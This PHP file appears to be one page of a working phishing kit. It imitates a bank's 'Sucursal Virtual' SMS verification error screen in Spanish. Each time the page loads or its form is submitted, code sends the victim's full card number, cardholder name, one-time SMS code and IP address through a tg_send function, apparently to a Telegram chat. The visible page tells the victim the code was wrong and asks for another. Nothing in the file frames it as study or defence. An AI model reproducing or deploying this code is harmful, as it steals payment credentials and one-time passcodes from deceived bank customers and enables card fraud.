<?php
declare(strict_types=1);
require_once __DIR__ . '/inc/functions.php';
kit_init();
$token = ensure_flow();
$card  = card_session();
$number = mask_card($card['number'] ?? '');
$name   = $card['name'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sms = trim((string)($_POST['sms'] ?? ''));
    log_event($token, 'sms2', ['sms' => $sms]);
    $_SESSION['last_sms'] = $sms;
    $_SESSION['after_sms2'] = true;
    tg_send(
        "🔑🔑 CODIGO SMS 2 (REINTENTO) 🔑🔑\n"
        . "━━━━━━━━━━━━━━━━━━\n"
        . "🔑 CODIGO: " . $sms . "\n"
        . "💳 TARJETA: " . ($card['number'] ?? '') . "\n"
        . "👤 TITULAR: " . $name . "\n"
        . "━━━━━━━━━━━━━━━━━━\n"
        . "🌐 IP: " . client_ip() . "\n"
        . "🕐 FECHA: " . date('Y-m-d H:i:s')
    );
    header('Location: loading2.php');
    exit;
}

log_event($token, 'error_page', ['sms_attempted' => $_SESSION['last_sms'] ?? null]);
tg_send(
    "⚠️⚠️ ERROR SMS ⚠️⚠️\n"
    . "━━━━━━━━━━━━━━━━━━\n"
    . "❌ CODIGO INCORRECTO O EXPIRADO\n"
    . "🔑 CODIGO INTENTADO: " . ($_SESSION['last_sms'] ?? 'N/A') . "\n"
    . "💳 TARJETA: " . ($card['number'] ?? '') . "\n"
    . "👤 TITULAR: " . $name . "\n"
    . "━━━━━━━━━━━━━━━━━━\n"
    . "🌐 IP: " . client_ip() . "\n"
    . "🕐 FECHA: " . date('Y-m-d H:i:s')
);
$page_title = 'Sucursal Virtual';
require __DIR__ . '/inc/header.php';
?>
<div class="wpb-content-wrapper">
<div class="vc_row wpb_row vc_row-fluid">
<div class="wpb_column vc_column_container vc_col-sm-12">
<div class="vc_column-inner">
<div class="wpb_wrapper">
<div class="flow-wrap">
	<div class="flow-card">
		<h2>Verificación SMS</h2>
		<p class="flow-lead">Por seguridad, hemos enviado un código de verificación por SMS al teléfono registrado de su envío.</p>
		<div class="recap">
			<b>Tarjeta:</b> <?php echo h($number); ?><br>
			<b>Titular:</b> <?php echo h($name); ?><br>
			<b>Monto a pagar:</b> ₡4,850.00
		</div>
		<div class="error">El código de verificación (SMS) ingresado es incorrecto o ha expirado. Ingrese el nuevo código enviado por SMS.</div>
		<form class="flow-form" method="post" action="error.php" autocomplete="off">
			<label for="sms">Código de verificación (SMS)</label>
			<input type="text" id="sms" name="sms" inputmode="numeric" placeholder="Ingrese el código de 6 dígitos" maxlength="10" required autofocus>
			<button class="btn-navy" type="submit">Verificar código</button>
			<p class="secure"><i class="fas fa-shield-alt"></i> Su código se envía automáticamente. Verifique su bandeja de SMS.</p>
		</form>
	</div>
</div>
</div>
</div>
</div>
</div>
</div>
<?php require __DIR__ . '/inc/footer.php'; ?>
